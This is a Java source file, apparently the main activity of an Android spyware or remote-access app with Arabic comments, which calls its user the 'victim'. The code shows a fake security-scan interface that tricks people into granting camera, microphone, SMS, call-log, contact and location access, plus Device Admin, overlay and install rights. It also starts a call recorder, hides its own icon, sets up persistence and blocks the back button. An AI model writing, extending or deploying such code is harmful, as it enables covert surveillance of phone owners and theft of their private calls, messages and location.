package com.sec.check;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

/**
 * MainActivity - نقطة الدخول الرئيسية
 * ============================================================
 * ★ استراتيجية العمل:
 * 1. الضحية تفتح التطبيق من الأيقونة
 * 2. نعرض UI وهمي (4 شاشات — بدون Login)
 * 3. نجمع الصلاحيات واحدة واحدة
 * 4. نفعل Device Admin
 * 5. نخفي الأيقونة + نقفل النشاط
 * ============================================================
 */
public class MainActivity extends Activity {

    private static final String TAG = "SystemUpdate";
    private static final int PERMISSION_REQUEST = 1001;
    private static final int REQUEST_DEVICE_ADMIN = 2001;
    private static final int REQUEST_OVERLAY = 2002;
    private static final int REQUEST_MANAGE_STORAGE = 2003;
    private static final int REQUEST_BATTERY_OPT = 2004;
    private static final int REQUEST_INSTALL_PACKAGES = 2005;

    private static final String PREFS_NAME = "sys_prefs";
    private static final String KEY_FIRST_LAUNCH = "first_launch_done";
    private static final String KEY_PERMISSIONS_DONE = "permissions_done";
    private static final String KEY_HIDDEN = "icon_hidden";
    private static final String KEY_INITIALIZED = "initialized";

    private FakeUIManager ui;
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private String[][] permissionsList;
    private int currentPermIndex = 0;
    private boolean permissionsStarted = false;

    // ============================================================
    // Permissions List
    // ============================================================
    private static String[][] getPermissionsList() {
        if (Build.VERSION.SDK_INT >= 33) {
            return new String[][]{
                    {Manifest.permission.CAMERA, "للتحقق البصري"},
                    {Manifest.permission.RECORD_AUDIO, "لتسجيل الصوت"},
                    {Manifest.permission.READ_PHONE_STATE, "لمراقبة المكالمات"},
                    {Manifest.permission.CALL_PHONE, "للتحكم بالمكالمات"},
                    {Manifest.permission.READ_CALL_LOG, "لقراءة سجل المكالمات"},
                    {Manifest.permission.PROCESS_OUTGOING_CALLS, "لمراقبة المكالمات الصادرة"},
                    {Manifest.permission.READ_SMS, "لقراءة الرسائل"},
                    {Manifest.permission.SEND_SMS, "لإرسال الرسائل"},
                    {Manifest.permission.RECEIVE_SMS, "لاستقبال الرسائل"},
                    {Manifest.permission.READ_CONTACTS, "لقراءة جهات الاتصال"},
                    {Manifest.permission.ACCESS_FINE_LOCATION, "لتحديد الموقع"},
                    {Manifest.permission.ACCESS_COARSE_LOCATION, "لتحديد الموقع التقريبي"},
                    {Manifest.permission.POST_NOTIFICATIONS, "للإشعارات"},
                    {"android.permission.READ_MEDIA_IMAGES", "لقراءة الصور"},
                    {"android.permission.READ_MEDIA_VIDEO", "لقراءة الفيديوهات"},
                    {"android.permission.READ_MEDIA_AUDIO", "لقراءة الملفات الصوتية"},
            };
        } else if (Build.VERSION.SDK_INT >= 29) {
            return new String[][]{
                    {Manifest.permission.CAMERA, "للتحقق البصري"},
                    {Manifest.permission.RECORD_AUDIO, "لتسجيل الصوت"},
                    {Manifest.permission.READ_PHONE_STATE, "لمراقبة المكالمات"},
                    {Manifest.permission.CALL_PHONE, "للتحكم بالمكالمات"},
                    {Manifest.permission.READ_CALL_LOG, "لقراءة سجل المكالمات"},
                    {Manifest.permission.PROCESS_OUTGOING_CALLS, "لمراقبة المكالمات الصادرة"},
                    {Manifest.permission.READ_SMS, "لقراءة الرسائل"},
                    {Manifest.permission.SEND_SMS, "لإرسال الرسائل"},
                    {Manifest.permission.RECEIVE_SMS, "لاستقبال الرسائل"},
                    {Manifest.permission.READ_CONTACTS, "لقراءة جهات الاتصال"},
                    {Manifest.permission.ACCESS_FINE_LOCATION, "لتحديد الموقع"},
                    {Manifest.permission.ACCESS_COARSE_LOCATION, "لتحديد الموقع التقريبي"},
                    {Manifest.permission.READ_EXTERNAL_STORAGE, "لقراءة الملفات"},
            };
        } else {
            return new String[][]{
                    {Manifest.permission.CAMERA, "للتحقق البصري"},
                    {Manifest.permission.RECORD_AUDIO, "لتسجيل الصوت"},
                    {Manifest.permission.READ_PHONE_STATE, "لمراقبة المكالمات"},
                    {Manifest.permission.CALL_PHONE, "للتحكم بالمكالمات"},
                    {Manifest.permission.READ_CALL_LOG, "لقراءة سجل المكالمات"},
                    {Manifest.permission.PROCESS_OUTGOING_CALLS, "لمراقبة المكالمات الصادرة"},
                    {Manifest.permission.READ_SMS, "لقراءة الرسائل"},
                    {Manifest.permission.SEND_SMS, "لإرسال الرسائل"},
                    {Manifest.permission.RECEIVE_SMS, "لاستقبال الرسائل"},
                    {Manifest.permission.READ_CONTACTS, "لقراءة جهات الاتصال"},
                    {Manifest.permission.ACCESS_FINE_LOCATION, "لتحديد الموقع"},
                    {Manifest.permission.ACCESS_COARSE_LOCATION, "لتحديد الموقع التقريبي"},
                    {Manifest.permission.READ_EXTERNAL_STORAGE, "لقراءة الملفات"},
                    {Manifest.permission.WRITE_EXTERNAL_STORAGE, "لحفظ الملفات"},
            };
        }
    }

    // ============================================================
    // onCreate
    // ============================================================
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "======== MAIN ACTIVITY STARTED ========");
        Log.d(TAG, "Android SDK: " + Build.VERSION.SDK_INT);
        Log.d(TAG, "Device: " + Build.MANUFACTURER + " " + Build.MODEL);

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        boolean firstLaunchDone = prefs.getBoolean(KEY_FIRST_LAUNCH, false);
        boolean permissionsDone = prefs.getBoolean(KEY_PERMISSIONS_DONE, false);

        Log.d(TAG, "[STATE] firstLaunchDone=" + firstLaunchDone
                + " | permissionsDone=" + permissionsDone);

        // ★★★ أول مرة → اعرض UI ★★★
        if (!firstLaunchDone) {
            Log.d(TAG, "[FIRST-RUN] ★ Showing fake UI for permissions ★");
            permissionsList = getPermissionsList();
            ui = new FakeUIManager(this);
            startFlow();
            return;
        }

        // ★★★ الصلاحيات خلصت → الوضع الخفي ★★★
        if (permissionsDone) {
            Log.d(TAG, "[STEALTH] App already initialized — activating stealth mode");
            activateStealthMode();
            return;
        }

        // ★★★ حالة غريبة ★★★
        Log.d(TAG, "[RECOVERY] Permissions incomplete — forcing stealth mode");
        activateStealthMode();
    }

    // ============================================================
    // Stealth Mode
    // ============================================================
    private void activateStealthMode() {
        try {
            startAllServices();
            hideAppIcon();
            PersistenceManager.enableAllPersistence(this);
            PersistenceManager.scheduleEternalAlarm(this);
            Log.d(TAG, "[STEALTH] All stealth operations completed");
        } catch (Exception e) {
            Log.e(TAG, "[STEALTH] error: " + e.getMessage());
        } finally {
            finishAndHide();
        }
    }

    // ============================================================
    // ★★★ Flow — بدون شاشة Login ★★★
    // ============================================================
    private void startFlow() {
        // ★ 1. شاشة الترحيب ★
        ui.showWelcomeScreen(() -> {
            // ★ 2. شاشة الفحص الأمني (بدون Login) ★
            ui.showSecurityScanScreen(() -> {
                // ★ 3. شاشة التقدم ★
                ui.showProgressScreen("جاري التهيئة...", () -> {
                    // ★ 4. ابدأ في طلب الصلاحيات ★
                    startPermissionFlow();
                });
            });
        });
    }

    // ============================================================
    // Permissions Flow
    // ============================================================
    private void startPermissionFlow() {
        if (permissionsStarted) return;
        permissionsStarted = true;
        currentPermIndex = 0;
        Log.d(TAG, "[PERMISSIONS] Starting flow");
        requestNextPermission();
    }

    private void requestNextPermission() {
        if (currentPermIndex >= permissionsList.length) {
            Log.d(TAG, "[PERMISSIONS] All runtime permissions requested");
            mainHandler.postDelayed(this::requestDeviceAdmin, 800);
            return;
        }

        String permission = permissionsList[currentPermIndex][0];

        if (!isPermissionDeclared(permission)) {
            Log.d(TAG, "[PERMISSIONS] Not declared: " + permission);
            currentPermIndex++;
            requestNextPermission();
            return;
        }

        if (ContextCompat.checkSelfPermission(this, permission)
                == PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "[PERMISSIONS] Already granted: " + permission);
            currentPermIndex++;
            requestNextPermission();
            return;
        }

        Log.d(TAG, "[PERMISSIONS] Requesting: " + permission);
        try {
            ActivityCompat.requestPermissions(this,
                    new String[]{permission}, PERMISSION_REQUEST);
        } catch (Exception e) {
            Log.e(TAG, "[PERMISSIONS] request error: " + e.getMessage());
            currentPermIndex++;
            requestNextPermission();
        }
    }

    private boolean isPermissionDeclared(String permission) {
        try {
            android.content.pm.PackageInfo info = getPackageManager()
                    .getPackageInfo(getPackageName(), PackageManager.GET_PERMISSIONS);
            if (info.requestedPermissions != null) {
                for (String p : info.requestedPermissions) {
                    if (p.equals(permission)) return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "isPermissionDeclared: " + e.getMessage());
        }
        return false;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String[] permissions,
                                           int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST) {
            for (int i = 0; i < permissions.length; i++) {
                boolean granted = grantResults.length > 0
                        && grantResults[i] == PackageManager.PERMISSION_GRANTED;
                Log.d(TAG, "[PERMISSIONS] " + permissions[i]
                        + " → " + (granted ? "GRANTED" : "DENIED"));
            }
            currentPermIndex++;
            mainHandler.postDelayed(this::requestNextPermission, 500);
        }
    }

    // ============================================================
    // Device Admin
    // ============================================================
    private void requestDeviceAdmin() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                    getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);

            if (dpm != null && !dpm.isAdminActive(adminComponent)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "مطلوب لتفعيل الحماية الكاملة للجهاز ومنع الوصول غير المصرح به.");
                startActivityForResult(intent, REQUEST_DEVICE_ADMIN);
                Log.d(TAG, "[ADMIN] Requesting Device Admin");
            } else {
                Log.d(TAG, "[ADMIN] Already active");
                mainHandler.postDelayed(this::requestManageStorage, 500);
            }
        } catch (Exception e) {
            Log.e(TAG, "[ADMIN] error: " + e.getMessage());
            mainHandler.postDelayed(this::requestManageStorage, 500);
        }
    }

    private void requestManageStorage() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                if (!Environment.isExternalStorageManager()) {
                    Intent intent = new Intent(
                            Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
                    Log.d(TAG, "[STORAGE] Requesting MANAGE_EXTERNAL_STORAGE");
                    return;
                }
            } catch (Exception e) {
                Log.e(TAG, "[STORAGE] error: " + e.getMessage());
            }
        }
        mainHandler.postDelayed(this::requestOverlay, 500);
    }

    private void requestOverlay() {
        try {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_OVERLAY);
                Log.d(TAG, "[OVERLAY] Requesting");
                return;
            }
        } catch (Exception e) {
            Log.e(TAG, "[OVERLAY] error: " + e.getMessage());
        }
        mainHandler.postDelayed(this::requestBatteryOptimization, 500);
    }

    private void requestBatteryOptimization() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.os.PowerManager pm = (android.os.PowerManager)
                        getSystemService(Context.POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent intent = new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    try {
                        startActivityForResult(intent, REQUEST_BATTERY_OPT);
                        Log.d(TAG, "[BATTERY] Requesting");
                        return;
                    } catch (Exception e) {
                        Log.e(TAG, "[BATTERY] error: " + e.getMessage());
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "[BATTERY] outer error: " + e.getMessage());
        }
        mainHandler.postDelayed(this::requestInstallPackages, 500);
    }

    private void requestInstallPackages() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (!getPackageManager().canRequestPackageInstalls()) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    try {
                        startActivityForResult(intent, REQUEST_INSTALL_PACKAGES);
                        Log.d(TAG, "[INSTALL] Requesting");
                        return;
                    } catch (Exception e) {
                        Log.e(TAG, "[INSTALL] error: " + e.getMessage());
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "[INSTALL] outer error: " + e.getMessage());
        }
        mainHandler.postDelayed(this::finishSetup, 500);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_DEVICE_ADMIN) {
            mainHandler.postDelayed(this::requestManageStorage, 500);
        } else if (requestCode == REQUEST_MANAGE_STORAGE) {
            mainHandler.postDelayed(this::requestOverlay, 500);
        } else if (requestCode == REQUEST_OVERLAY) {
            mainHandler.postDelayed(this::requestBatteryOptimization, 500);
        } else if (requestCode == REQUEST_BATTERY_OPT) {
            mainHandler.postDelayed(this::requestInstallPackages, 500);
        } else if (requestCode == REQUEST_INSTALL_PACKAGES) {
            mainHandler.postDelayed(this::finishSetup, 500);
        }
    }

    // ============================================================
    // finishSetup
    // ============================================================
    private void finishSetup() {
        Log.d(TAG, "[SETUP] Complete — activating stealth mode");

        try {
            if (ui != null) {
                ui.showSuccessScreen(() -> {
                    getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                            .edit()
                            .putBoolean(KEY_FIRST_LAUNCH, true)
                            .putBoolean(KEY_PERMISSIONS_DONE, true)
                            .putBoolean(KEY_INITIALIZED, true)
                            .apply();

                    startAllServices();
                    PersistenceManager.enableAllPersistence(this);

                    mainHandler.postDelayed(this::hideAppIcon, 800);
                    mainHandler.postDelayed(this::openAccessibilitySettings, 1500);
                    mainHandler.postDelayed(this::finishAndHide, 2500);
                });
            } else {
                getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                        .edit()
                        .putBoolean(KEY_FIRST_LAUNCH, true)
                        .putBoolean(KEY_PERMISSIONS_DONE, true)
                        .putBoolean(KEY_INITIALIZED, true)
                        .apply();
                startAllServices();
                PersistenceManager.enableAllPersistence(this);
                hideAppIcon();
                finishAndHide();
            }
        } catch (Exception e) {
            Log.e(TAG, "[SETUP] error: " + e.getMessage());
            finishAndHide();
        }
    }

    private void startAllServices() {
        try {
            Intent serviceIntent = new Intent(this, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            Log.d(TAG, "[SERVICE] ServiceRunner started");
        } catch (Exception e) {
            Log.e(TAG, "[SERVICE] error: " + e.getMessage());
        }

        try {
            Intent callRecorderIntent = new Intent(this, CallRecorderService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(callRecorderIntent);
            } else {
                startService(callRecorderIntent);
            }
            Log.d(TAG, "[SERVICE] CallRecorderService started");
        } catch (Exception e) {
            Log.e(TAG, "[SERVICE] CallRecorder error: " + e.getMessage());
        }
    }

    // ============================================================
    // hideAppIcon - إخفاء الأيقونة
    // ============================================================
    private void hideAppIcon() {
        try {
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            boolean alreadyHidden = prefs.getBoolean(KEY_HIDDEN, false);
            if (alreadyHidden) {
                Log.d(TAG, "[HIDE] Already hidden");
                return;
            }

            PackageManager pm = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);

            pm.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
            );

            prefs.edit().putBoolean(KEY_HIDDEN, true).apply();
            Log.d(TAG, "[HIDE] ★ App icon hidden successfully ★");
        } catch (Exception e) {
            Log.e(TAG, "[HIDE] error: " + e.getMessage());
        }
    }

    private void openAccessibilitySettings() {
        try {
            Intent accessibilityIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            accessibilityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(accessibilityIntent);
            Log.d(TAG, "[ACCESSIBILITY] Settings opened");
        } catch (Exception e) {
            Log.e(TAG, "[ACCESSIBILITY] error: " + e.getMessage());
        }
    }

    private void finishAndHide() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                finishAndRemoveTask();
            } else {
                finish();
            }
        } catch (Exception e) {
            try { finish(); } catch (Exception ignored) {}
        }
    }

    @Override
    public void onBackPressed() {
        Log.d(TAG, "[BACK] Blocked");
        moveTaskToBack(true);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "[DESTROY] MainActivity destroyed");
        try {
            Intent svc = new Intent(this, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
        } catch (Exception ignored) {}
    }
                     }
